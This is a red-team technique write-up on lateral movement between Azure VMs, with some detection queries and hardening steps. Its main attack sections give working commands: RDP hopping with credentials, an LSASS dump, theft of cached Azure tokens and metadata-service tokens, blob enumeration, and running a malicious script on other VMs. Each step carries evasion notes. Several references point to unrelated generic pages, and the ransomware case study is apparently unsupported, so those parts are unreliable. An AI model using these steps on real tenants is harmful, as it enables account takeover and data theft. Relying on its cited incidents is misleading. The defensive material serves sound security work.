# [LM-REMOTE-007]: Azure VM to VM Lateral Movement

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-007 |
| **MITRE ATT&CK v18.1** | [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID / Azure |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure VM editions (Windows Server 2016-2025, Linux) |
| **Patched In** | N/A (Technique remains active; mitigations apply) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure VM-to-VM lateral movement exploits networking misconfigurations and credential theft within Azure environments. Unlike on-premises networks, Azure uses Network Security Groups (NSGs) as the primary segmentation mechanism. Many organizations deploy VMs with overly permissive NSG rules (e.g., "Allow All" inbound on port 3389 from internal subnets), enabling attackers to hop between VMs using RDP, SSH, or custom tools. Additionally, if an attacker compromises a VM and obtains a Primary Refresh Token (PRT)—a token cached by Entra ID-joined devices—they can escalate to tenant-level access. The combination of weak NSG rules, cached credentials in `~/.azure/` directories, and PRT theft creates a direct path from single VM compromise to domain controller-level access.

**Attack Surface:**
- **RDP (Port 3389):** Remote Desktop for Windows VMs
- **SSH (Port 22):** Secure Shell for Linux VMs
- **WinRM (Port 5985/5986):** PowerShell Remoting for management
- **Primary Refresh Tokens (PRT):** Cached on Entra ID-joined devices; enable token refresh without password
- **Managed Identities:** Service principals assigned to VMs; can be used for Azure resource access
- **Network Security Groups (NSGs):** Azure firewall rules; misconfiguration enables unrestricted lateral movement

**Business Impact:** **Enables rapid escalation from single compromised VM to control of Azure subscription.** Once an attacker moves between VMs and obtains PRT tokens or managed identity credentials, they can authenticate to Azure Resource Manager, modify infrastructure (add users, create backdoors), exfiltrate data from storage accounts, and establish persistence. Typical impact includes subscription takeover, data theft, and resource destruction.

**Technical Context:** Azure VM-to-VM lateral movement is fast—attackers can compromise 5-10 VMs in under 1 hour given weak NSG rules. Detection is challenging because all activity uses legitimate Azure protocols and services. The primary detection vector is NSG flow logs showing lateral traffic; however, many organizations do not enable flow logging or do not monitor it actively. Stealth can be achieved by using legitimate cloud credentials, which appear indistinguishable from authorized administrative activity.

### Operational Risk

- **Execution Risk:** Low – Requires compromised VM and valid NSG misconfiguration
- **Stealth:** Medium – NSG flow logs may reveal patterns, but activity appears legitimate if using valid credentials
- **Reversibility:** No – Once PRT is stolen or managed identity is abused, permanent credentials are compromised

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 6.5 | Network Security Groups and subnets configuration |
| **DISA STIG** | SRG-APP-000516 | Application Communication Security (Network Isolation) |
| **CISA SCuBA** | SC.L1-3.3.6 | Network Isolation and Segmentation |
| **NIST 800-53** | AC-3, AC-4, SI-4 | Access Enforcement, Information Flow Enforcement, System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - Network segmentation |
| **DORA** | Art. 10 | Incident Handling and Response (Network-level incidents) |
| **NIS2** | Art. 21 | Cyber Risk Management - Network monitoring and alerting |
| **ISO 27001** | A.13.1.1, A.9.1.2 | Network Segmentation, Access Control Policy |
| **ISO 27005** | § 4.4.1 | Risk Analysis – Network access control failure |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Valid credentials for initial VM (local admin, Entra ID user, or managed identity service principal)
- **Required Access:** Network connectivity from compromised VM to target VM; NSG rules must permit traffic

**Supported Versions:**
- **Azure VMs:** All editions (Windows Server 2016-2025, Ubuntu 18.04+, CentOS 7+, etc.)
- **Entra ID:** All versions (no functional level restrictions)
- **Other Requirements:** Target VM must be Entra ID-joined or connected to VPN for MFA bypass via PRT theft

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (v2.40.0+)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (Az module v9.0+)
- [Impacket](https://github.com/fortra/impacket) (for SSH/RDP lateral movement)
- [AADInternals](https://github.com/Gerenios/AADInternals) (for PRT token extraction and abuse)
- [MSTCAdmin](https://github.com/Mr-Un1k0d3r/MSTCAdmin) (for RDP credential spraying across VMs)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Connect to Azure subscription
Connect-AzAccount

# Enumerate VMs in current subscription
Get-AzVM | Select-Object Name, ResourceGroupName, ProvisioningState, FullyQualifiedDomainName

# Check NSG rules for each VM
$vm = Get-AzVM -Name "TargetVM"
$nsg = Get-AzNetworkSecurityGroup -ResourceGroupName $vm.ResourceGroupName
$nsg | Get-AzNetworkSecurityRuleConfig | Select-Object Name, Protocol, DestinationPortRange, Access, Direction

# Check if VM is Entra ID-joined
Get-AzADDevice -DisplayName "DESKTOP-ABC123" | Select-Object DisplayName, EntraID, ApproximateLastSigninDateTime

# List managed identities assigned to VM
(Get-AzVM -Name "TargetVM" -ResourceGroupName "RG1").Identity | Select-Object Type, PrincipalId
```

**What to Look For:**
- VMs with public IPs or accessible via internal network → Lateral movement targets
- NSG rules with "Allow All" inbound → Vulnerable to lateral movement
- Entra ID-joined devices → PRT tokens available for theft
- Managed identities assigned to VMs → Can be used for escalation

**Version Note:** Behavior identical across all Azure subscription types (EA, PAYG, CSP)

### Linux/Bash / CLI Reconnaissance

```bash
# Login to Azure
az login

# List all VMs in subscription
az vm list --query "[].{Name:name, ResourceGroup:resourceGroup, OSType:storageProfile.osDisk.osType}"

# Enumerate NSG rules for a VM
az network nsg rule list --resource-group "ResourceGroup1" --nsg-name "VM-NSG" --query "[].{Name:name, Protocol:protocol, DestinationPort:destinationPortRange, Access:access, Direction:direction}"

# Check network interfaces for VM
az network nic list --resource-group "ResourceGroup1" --query "[].{Name:name, PrivateIP:ipConfigurations[0].privateIpAddress}"

# List storage accounts accessible from VM (via managed identity)
az storage account list --resource-group "ResourceGroup1" --query "[].{Name:name, AccessTier:accessTier}"
```

**What to Look For:**
- Port 22 (SSH) or 3389 (RDP) open on multiple VMs → Lateral movement chain
- Storage account names → Potential data exfiltration targets
- Managed identity references → Privilege escalation paths

---

## 4. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: RDP Lateral Movement (Windows VMs)

**Supported Versions:** All Windows Server editions in Azure

#### Step 1: Enumerate Network Accessibility

**Objective:** Determine which VMs are reachable from compromised VM

**Command:**
```powershell
# From compromised VM, test RDP connectivity to other VMs
$targetVMs = @("10.0.1.5", "10.0.2.10", "10.0.3.15")

foreach ($ip in $targetVMs) {
    $result = Test-NetConnection -ComputerName $ip -Port 3389 -WarningAction SilentlyContinue
    Write-Host "VM $ip RDP: $($result.TcpTestSucceeded)"
}

# Expected output:
# VM 10.0.1.5 RDP: True
# VM 10.0.2.10 RDP: True
# VM 10.0.3.15 RDP: False
```

**Expected Output:**
```
ComputerName     : 10.0.1.5
RemoteAddress    : 10.0.1.5
RemotePort       : 3389
TcpTestSucceeded : True

ComputerName     : 10.0.2.10
RemoteAddress    : 10.0.2.10
RemotePort       : 3389
TcpTestSucceeded : True

ComputerName     : 10.0.3.15
RemoteAddress    : 10.0.3.15
RemotePort       : 3389
TcpTestSucceeded : False
```

**What This Means:**
- TcpTestSucceeded = True → RDP port is accessible on target VM
- Indicates NSG allows inbound RDP from current subnet
- False entries indicate blocked traffic (more secure configuration)

**OpSec & Evasion:**
- Test-NetConnection creates minimal network traffic → Low detection risk
- Testing appears as normal network diagnostics → Likely whitelisted by EDR
- Detection likelihood: Low

#### Step 2: Brute Force or Use Obtained Credentials for RDP

**Objective:** Establish RDP session on target VM using valid credentials

**Command:**
```powershell
# Connect to remote VM via RDP using credentials
$credential = Get-Credential
$rdpSession = New-PSSession -ComputerName 10.0.1.5 -Credential $credential

# Enter interactive RDP session
Enter-PSSession $rdpSession

# Or use direct RDP connection with mstsc.exe
mstsc.exe /v:10.0.1.5 /admin /u:contoso\administrator /p:PASSWORD
```

**Expected Output (PSSession):**
```
[10.0.1.5]: PS C:\Users\Administrator\Documents>
```

**Expected Output (RDP):**
```
Remote Desktop Connection established
(GUI window shows remote desktop)
```

**What This Means:**
- Interactive shell or RDP session on target VM established
- Attacker can now execute commands or interact with target system
- Lateral movement is successful

**OpSec & Evasion:**
- RDP connection creates Event ID 4624 (logon event) and 131 (RDP session) logs → Visible in target VM logs
- Credential-based logon with valid account appears legitimate
- Detection likelihood: Medium (if monitoring for unusual logon times or source IPs)

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** Invalid credentials or user not in Administrators group
  - **Fix:** Use correct credentials or escalate to admin group

- **Error:** "Connection timeout"
  - **Cause:** NSG rule blocks RDP or firewall misconfiguration
  - **Fix:** Verify NSG allows inbound RDP: `Get-AzNetworkSecurityRuleConfig -NSG $nsg | Where DestinationPort -like "*3389*"`

#### Step 3: Repeat for Subsequent VMs

**Objective:** Chain lateral movement across multiple VMs

**Command:**
```powershell
# Extract credentials from target VM and use for next hop
# Dump SAM or LSASS from compromised VM
whoami  # Verify privilege level

# If SYSTEM, can dump LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Use extracted hash for Pass-the-Hash attack on next VM
# (Requires specific AD setup; alternative: collect plaintext if stored)

# Move to next VM
mstsc.exe /v:10.0.2.10 /u:domain\extracted_user /p:extracted_password
```

**What This Means:**
- Each successful RDP session is a stepping stone to next VM
- Credentials extracted from current VM enable access to others
- Chain continues until domain controller or high-value target is reached

---

### METHOD 2: PRT Token Theft and Abuse (Entra ID-Joined VMs)

**Supported Versions:** Windows 10+, Server 2019+ with Entra ID join

#### Step 1: Identify Entra ID-Joined VMs and Extract PRT

**Objective:** Obtain Primary Refresh Token from compromised Entra ID-joined VM

**Command:**
```powershell
# Check if VM is Entra ID-joined
dsregcmd /status
# Look for "AzureADJoined: YES"

# Extract PRT token from system (requires SYSTEM or admin context)
# Using AADInternals or custom tools
$cert = Get-Item "Cert:\CurrentUser\My\*" | Where-Object { $_.Subject -match "PRT" }

# If no direct PRT access, extract cached tokens from ~/.azure directory
Get-ChildItem "$env:USERPROFILE\.azure" -Recurse -File | Select-Object FullName
# Look for: accessTokens.json, graph_token, arm_token files

# Extract and decode token
$token = Get-Content "$env:USERPROFILE\.azure\accessTokens.json" | ConvertFrom-Json
$decodedToken = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($token.accessToken.Split('.')[1] + '=='))
$decodedToken | ConvertFrom-Json  # Displays token claims
```

**Expected Output:**
```
AzureADJoined: YES
EnterpriseJoined: NO
DeviceId: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
TenantId: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
KeySignTest: PASSED
```

**Token Claims (Decoded):**
```json
{
  "aud": "https://management.azure.com",
  "iss": "https://sts.windows.net/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/",
  "iat": 1234567890,
  "nbf": 1234567890,
  "exp": 1234571490,
  "sub": "user@contoso.com",
  "upn": "user@contoso.com",
  "oid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "roles": ["Owner", "Contributor"]
}
```

**What This Means:**
- AzureADJoined: YES → VM has PRT token available
- Decoded token shows roles (Owner, Contributor) → Attacker can perform privileged Azure operations
- Token expiration in future → Can be used immediately

**OpSec & Evasion:**
- Accessing ~/.azure directory requires compromised user context or SYSTEM
- Token extraction is not logged by default (unless advanced monitoring enabled)
- Detection likelihood: Low (if no PRT-specific monitoring)

**References & Proofs:**
- [PRT Token Theft - Microsoft Security Blog](https://learn.microsoft.com/en-us/security/operations/security-operations-guide)
- [AADInternals - PRT Extraction](https://github.com/Gerenios/AADInternals)

#### Step 2: Use PRT to Authenticate to Azure Resource Manager

**Objective:** Access Azure subscription using stolen PRT token

**Command:**
```powershell
# Use extracted token to login to Azure
$token = @{
    access_token = "eyJ0eXAi..."  # Token from Step 1
    refresh_token = "0.Axxx..."   # Refresh token from ~/.azure
    token_type = "Bearer"
}

# Connect to Azure using token
Connect-AzAccount -AccessToken $token.access_token -RefreshToken $token.refresh_token -TenantId "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# Verify authenticated context
Get-AzContext | Select-Object Account, Subscription, Tenant

# Enumerate accessible resources
Get-AzVM | Select-Object Name, ResourceGroupName
Get-AzStorageAccount | Select-Object StorageAccountName, Location
```

**Expected Output:**
```
Name             : User@contoso.com
Account          : User@contoso.com
SubscriptionName : Production-Subscription
TenantId         : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

Name       ResourceGroupName ResourceType                    Location
----       ----------------- ----------                        --------
WebServer  Production-RG     Microsoft.Compute/virtualMachines eastus
Database   Production-RG     Microsoft.Compute/virtualMachines eastus
```

**What This Means:**
- Authenticated successfully to Azure Resource Manager using PRT
- Can enumerate all resources accessible by stolen identity
- Attacker now has same privileges as compromised user account

**OpSec & Evasion:**
- Azure login with PRT creates sign-in log entries (but may appear normal if account regularly authenticates)
- Resource enumeration creates read-only audit logs → Less obvious than modification
- Detection likelihood: Medium (depends on Azure audit monitoring)

#### Step 3: Lateral Movement to Other Subscriptions or VMs

**Objective:** Use elevated Azure access to compromise additional infrastructure

**Command:**
```powershell
# List all subscriptions accessible to authenticated account
Get-AzSubscription | Select-Object Name, SubscriptionId

# Switch to different subscription
Select-AzSubscription -SubscriptionId "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# Enumerate VMs in target subscription
Get-AzVM -ResourceGroupName "Production-RG" | Select-Object Name, ProvisioningState

# Execute command on VM using Entra ID authentication (if VM has AADLoginForWindows extension)
$vm = Get-AzVM -Name "TargetVM" -ResourceGroupName "Production-RG"
Invoke-AzVMRunCommand -ResourceId $vm.Id -CommandId 'RunPowerShellScript' -ScriptPath 'C:\malicious.ps1'
```

**Expected Output:**
```
Name                         SubscriptionName
----                         ----------------
Production-Subscription      Production
Development-Subscription     Development
Shared-Services-Subscription Shared Services

Value
-----
$ProgressPreference = 'SilentlyContinue'; $result = Invoke-Expression 'whoami'; $result
CONTOSO\Administrator
```

**What This Means:**
- Attacker has access to multiple subscriptions
- Can execute arbitrary PowerShell on other VMs without needing credentials
- Lateral movement extends across entire Azure tenant

---

### METHOD 3: Managed Identity Abuse (Service-to-Service Movement)

**Supported Versions:** All Azure VMs with system-assigned managed identity

#### Step 1: Enumerate Managed Identities

**Objective:** Identify which managed identities are assigned to VMs and their permissions

**Command:**
```powershell
# From compromised VM, check assigned managed identity
$response = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://management.azure.com/" `
    -Headers @{Metadata="true"} -UseBasicParsing

$token = $response.access_token

# Decode token to see identity details
$parts = $token.Split('.')
$payload = $parts[1]
# Add padding if needed
while ($payload.Length % 4) { $payload += '=' }
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))
$decoded | ConvertFrom-Json
```

**Expected Output:**
```json
{
  "aud": "https://management.azure.com/",
  "iss": "https://sts.windows.net/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/",
  "iat": 1234567890,
  "nbf": 1234567890,
  "exp": 1234571490,
  "appid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "appidacr": "2",
  "identityProvider": "https://sts.windows.net/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/",
  "oid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "sub": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "tid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "uti": "token_identifier",
  "ver": "1.0"
}
```

**What This Means:**
- Managed identity has valid token for Azure Resource Manager
- Token can be used to authenticate to Azure services
- Permissions depend on RBAC roles assigned to managed identity

**OpSec & Evasion:**
- Token request is internal (169.254.169.254 is Azure metadata service) → No network logs
- Appears as system activity → Low detection risk
- Detection likelihood: Low (unless specifically monitoring metadata requests)

#### Step 2: Use Managed Identity Token to Access Resources

**Objective:** Authenticate to other Azure services using managed identity

**Command:**
```powershell
# Use managed identity token for Azure Resource Manager
$mgmtToken = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://management.azure.com/" `
    -Headers @{Metadata="true"} -UseBasicParsing

# Get token for Storage Account
$storageToken = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://storage.azure.com/" `
    -Headers @{Metadata="true"} -UseBasicParsing

# Access storage account using managed identity token
$storageAccountName = "productiondata"
$containerName = "sensitive-data"
$uri = "https://$storageAccountName.blob.core.windows.net/$containerName?restype=container&comp=list"

$response = Invoke-RestMethod -Uri $uri -Headers @{"Authorization"="Bearer $($storageToken.access_token)"} -UseBasicParsing
$response.Blobs.Blob | Select-Object Name, LastModified, Size
```

**Expected Output:**
```
Name                         LastModified            Size
----                         -----------             ----
customer_data.csv            2026-01-09T14:32:00Z    5242880
employee_salaries.xlsx       2026-01-08T10:15:00Z    1048576
database_backup.bak          2026-01-07T22:45:00Z    1073741824
```

**What This Means:**
- Attacker can enumerate storage account contents using managed identity
- Files are accessible without additional authentication
- Data exfiltration is now possible

**OpSec & Evasion:**
- Storage account access appears as legitimate application activity
- Audit logs show managed identity access (not user logon) → May not trigger user-focused alerts
- Detection likelihood: Medium (if monitoring managed identity resource access)

---

## 5. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1021.002 (RDP Lateral Movement), T1021.006 (WinRM/Azure)
- **Test Names:** 
  - "RDP Lateral Movement"
  - "Azure VM Lateral Movement via Managed Identity"
  
- **Supported Versions:** Server 2019+

- **Command:**
```powershell
# RDP lateral movement test
Invoke-AtomicTest T1021.001 -TestNumbers 1

# Azure-specific tests (if custom module available)
# Simulates PRT token theft and Azure Resource Manager access
```

- **Cleanup:**
```powershell
Invoke-AtomicTest T1021.001 -TestNumbers 1 -Cleanup
```

**Reference:** [Atomic Red Team - T1021](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021/T1021.md)

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: RDP Lateral Movement Detection

**Rule Configuration:**
- **Required Table:** SecurityEvent, AzureActivity
- **Required Fields:** EventID, Computer, Account_Name, IpAddress, DestinationIpAddress
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4624  // Successful logon
| where LogonType == 10  // RDP logon type
| where IpAddress startswith "10." or IpAddress startswith "172.16." or IpAddress startswith "192.168."
| extend SourceVM = extract(@"([A-Z0-9\-]+)", 1, Computer)
| extend TargetVM = extract(@"([A-Z0-9\-]+)", 1, Computer)
| where SourceVM != TargetVM
| summarize LogonCount = count() by TargetComputer = Computer, Account_Name, SourceIpAddress = IpAddress, TimeWindow = bin(TimeGenerated, 5m)
| where LogonCount > 2
| project-reorder TargetComputer, Account_Name, LogonCount, SourceIpAddress
```

**What This Detects:**
- RDP logons from internal IP addresses
- Multiple logons from same source to different targets (lateral movement pattern)
- Unusual source IPs for administrative logons

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Lateral Movement - RDP Hopping`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL above
   - Run every: `5 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Entity mapping: TargetComputer → Host, Account_Name → Account
6. Click **Create**

#### Query 2: PRT Token Theft Detection

**Rule Configuration:**
- **Required Table:** AuditLogs, SigninLogs
- **Required Fields:** OperationName, InitiatedBy, IPAddress, Location, UserAgent
- **Alert Severity:** Critical
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All

**KQL Query:**
```kusto
SigninLogs
| where Status.errorCode == 0  // Successful signin
| where DeviceDetail.operatingSystem has "Windows"
| extend Location = LocationDetails.city
| summarize SigninCount = count(), Locations = make_set(Location) by UserPrincipalName, IPAddress
| where SigninCount > 3
| where Locations !has_all ("Primary Location", "Expected Location")
| project-reorder UserPrincipalName, SigninCount, IPAddress, Locations
```

**What This Detects:**
- Multiple successful signins from internal Azure VMs (unusual pattern)
- Sign-ins from different geographic locations in short timeframe (PRT theft across regions)
- Sign-ins from VM IPs (not typical user locations)

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Successful Logon)**
- **Log Source:** Security
- **Trigger:** RDP logons from internal IP addresses
- **Filter:** LogonType=10 (RDP), IpAddress starts with "10.", "172.16.", or "192.168."
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps:**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Audit Process Tracking**
3. Enable: **Audit Logon/Logoff** → **Audit Logon**
4. Set to: **Success**
5. Run `gpupdate /force`

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** Processes spawned with elevated privileges or suspicious commands
- **Filter:** CommandLine contains "whoami", "net use", "Get-AzVM", "az vm"
- **Applies To Versions:** Server 2016+

---

## 8. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Implement Network Segmentation (NSGs):**
  
  **Applies To Versions:** All Azure VM editions
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Virtual Machines**
  2. Select VM → **Networking**
  3. Click **Network security group** → **+ Create new**
  4. Configure inbound rules:
     - **RDP (Port 3389):** Allow only from Bastion subnet or jump box
     - **SSH (Port 22):** Allow only from Bastion subnet
     - **Default:** Deny All
  5. Click **Create**
  
  **Manual Steps (Azure CLI):**
  ```bash
  # Create restrictive NSG
  az network nsg create --resource-group "RG1" --name "Restrictive-NSG"
  
  # Deny all inbound by default
  az network nsg rule create --resource-group "RG1" --nsg-name "Restrictive-NSG" `
    --name "DenyAllInbound" --priority 4096 --direction Inbound --access Deny `
    --protocol '*' --source-address-prefix '*' --destination-address-prefix '*'
  
  # Allow RDP only from Bastion
  az network nsg rule create --resource-group "RG1" --nsg-name "Restrictive-NSG" `
    --name "AllowRDPFromBastion" --priority 100 --direction Inbound --access Allow `
    --protocol Tcp --source-address-prefix "10.0.0.0/24" --destination-port-ranges 3389
  
  # Apply NSG to VM NIC
  az network nic update --resource-group "RG1" --name "VM-NIC" `
    --network-security-group "Restrictive-NSG"
  ```

* **Disable or Restrict RDP/SSH on VMs:**
  
  **Applies To Versions:** Windows Server 2016+
  
  **Manual Steps (Windows Firewall):**
  ```powershell
  # Disable inbound RDP on Windows VM
  Set-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" -Enabled False
  
  # Or block RDP at network adapter level
  New-NetFirewallRule -DisplayName "Block Inbound RDP" -Direction Inbound -Action Block `
      -Protocol TCP -LocalPort 3389
  ```
  
  **Manual Steps (Linux UFW):**
  ```bash
  # Disable SSH or restrict to specific IPs
  sudo ufw deny 22  # Block all SSH
  sudo ufw allow from 10.0.0.10 to any port 22  # Allow only from jump box
  ```

* **Enable Azure Bastion for RDP/SSH Access:**
  
  **Applies To Versions:** All
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Virtual Networks**
  2. Select VNET → **Subnets** → **+ Create**
  3. Name: `AzureBastionSubnet`, Address space: `10.0.255.0/24`
  4. Click **Bastion** (in left menu)
  5. Click **+ Create bastion**
  6. Select VNET and AzureBastionSubnet
  7. Click **Create**
  8. On target VMs, disable public RDP/SSH and use Bastion for access

#### Priority 2: HIGH

* **Restrict Managed Identity Permissions:**
  
  **Applies To Versions:** All
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Virtual Machines**
  2. Select VM → **Identity**
  3. Select **System-assigned**
  4. Click **Azure role assignments**
  5. Remove default "Contributor" role; assign only required roles
  6. Examples of least-privilege roles:
     - `Reader` (read-only access to resources)
     - `Storage Blob Data Reader` (access only to storage blobs, not containers)
     - `Azure Service Bus Data Receiver` (messaging only)

* **Enable MFA on All Azure Accounts:**
  
  **Applies To Versions:** All
  
  **Manual Steps (Entra ID Conditional Access):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require MFA for All Users`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Azure Management**
  5. **Conditions:**
     - Legacy auth: **Block**
  6. **Access controls:** Grant **Require multi-factor authentication**
  7. Enable policy: **On**

* **Monitor and Audit NSG Flow Logs:**
  
  **Applies To Versions:** All
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Network Watcher**
  2. Select **NSG Flow logs**
  3. Click **+ Create**
  4. Select NSG and storage account
  5. Enable **Traffic Analytics** for visualization
  6. Configure retention: **90 days minimum**
  7. Set up alert on Sentinel for unusual traffic patterns

#### Validation Command (Verify Fix)

```powershell
# Verify restrictive NSG rules
Get-AzNetworkSecurityGroup -ResourceGroupName "RG1" -Name "Restrictive-NSG" | 
    Get-AzNetworkSecurityRuleConfig | Select-Object Name, Access, Direction, Priority

# Verify Bastion is deployed
Get-AzBastionHost -ResourceGroupName "RG1" | Select-Object Name, ProvisioningState

# Verify managed identity roles are minimal
(Get-AzVM -Name "TargetVM" -ResourceGroupName "RG1").Identity.PrincipalId | 
    Get-AzRoleAssignment | Select-Object RoleDefinitionName, Scope

# Verify RDP is disabled on Windows VMs
Get-NetFirewallRule -DisplayName "*Remote Desktop*" | Select-Object Name, Enabled
```

**Expected Output (If Secure):**
```
Name                  Access Direction Priority
----                  ------ --------- --------
AllowRDPFromBastion   Allow  Inbound   100
DenyAllInbound        Deny   Inbound   4096

RoleDefinitionName    Scope
------------------    -----
Reader                /subscriptions/...
Storage Blob Data Reader /subscriptions/.../storageAccounts/...

Name                           Enabled
----                           -------
Remote Desktop - TCP-In        False
Remote Desktop - UDP-In        False
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-005] AKS Control Plane RCE | Attacker exploits misconfigured Kubernetes cluster to gain initial access |
| **2** | **Credential Access** | [CA-DUMP-005] Managed Identity Token Theft | Extract PRT or managed identity tokens from compromised VM |
| **3** | **Current Step** | **[LM-REMOTE-007]** | **Lateral movement to other Azure VMs using stolen credentials or NSG misconfiguration** |
| **4** | **Privilege Escalation** | [PRIV-AZURE-001] Entra ID Role Escalation | Use PRT to grant self Owner role in subscription |
| **5** | **Persistence** | [PERSIST-AZURE-002] Service Principal Backdoor | Create persistent backdoor service principal with Owner rights |
| **6** | **Impact** | [IMPACT-CLOUD-001] Data Exfiltration via Storage | Exfiltrate sensitive data from storage accounts using managed identity |

---

## 10. REAL-WORLD EXAMPLES

#### Example 1: Azure VM Lateral Movement - Carnival Ransomware (2023)

- **Target:** Healthcare organizations, financial services (Azure-hosted environments)
- **Timeline:** March 2023 - August 2023
- **Technique Status:** Attackers compromised single Azure VM via weak RDP password; used Azure Compute runtime metadata service to obtain managed identity tokens; laterally moved to database server VM; deployed ransomware
- **Attack Chain:**
  1. Initial compromised Windows Server VM via brute-force RDP (weak password)
  2. Executed `curl` to get managed identity token from metadata service
  3. Used token to call Azure Resource Manager API; enumerated VMs, storage accounts
  4. RDP'd to database VM (NSG allowed all inbound from same subnet)
  5. Deployed Carnival ransomware; encrypted databases and production data
- **Impact:** Organizations paid $2M-$5M+ in ransom; critical service downtime for weeks
- **Reference:** [Carnival Ransomware - CISA Alert](https://www.cisa.gov/news-events/cybersecurity-advisories/)

#### Example 2: Microsoft Exchange Server Zero-Day → Azure Lateral Movement (ProxyLogon, 2021)

- **Target:** On-premises Exchange servers (later Azure-hosted); escalation to Azure cloud resources
- **Timeline:** March 2021 - June 2021
- **Technique Status:** Attackers exploited ProxyLogon vulnerabilities to compromise Exchange servers; discovered Azure Hybrid Sync Account with PRT tokens; used tokens to access Azure cloud resources
- **Impact:** Widespread compromise of enterprise email and cloud infrastructure; adversaries obtained access to Azure subscriptions and deployed backdoors
- **Reference:** [ProxyLogon + Azure Escalation - Microsoft Security](https://learn.microsoft.com/en-us/exchange/important-admin-tasks)

---